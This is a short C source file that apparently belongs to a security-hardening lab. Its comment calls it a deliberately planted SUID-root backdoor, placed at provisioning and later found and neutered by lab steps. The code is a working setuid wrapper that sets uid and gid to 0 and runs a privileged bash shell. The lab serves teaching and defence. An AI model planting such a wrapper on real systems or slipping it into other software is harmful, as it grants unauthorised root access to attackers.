/* notes — SUID-root backdoor (lab plant).
 * A tiny setuid wrapper that drops you into a root shell. Compiled and made
 * SUID at provision time (see install.sh). Found by `find / -perm -4000` in
 * harden/01-recon; neutered by harden/03-privesc (chmod u-s). */
#include <unistd.h>
int main(void) {
    setgid(0);
    setuid(0);
    execl("/bin/bash", "bash", "-p", (char *)0);
    return 1;
}
